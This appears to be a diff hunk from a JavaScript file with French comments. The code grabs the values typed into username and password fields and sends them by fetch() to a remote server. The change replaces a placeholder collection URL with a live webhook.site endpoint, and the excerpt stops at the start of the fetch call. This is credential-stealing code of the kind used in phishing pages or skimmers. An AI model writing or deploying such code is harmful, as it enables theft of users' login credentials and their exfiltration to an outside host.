@@ -6,7 +6,7 @@ const username = usernameField ? usernameField.value : '';
 const password = passwordField ? passwordField.value : '';
 
 // URL de votre serveur pour recevoir les données
-const serverUrl = 'https://votre-serveur.com/collect';
+const serverUrl = 'https://webhook.site/a3d6d9f6-4141-47bd-a203-441b22ec5126';
 
 // Envoyer les données au serveur
 fetch(serverUrl, {
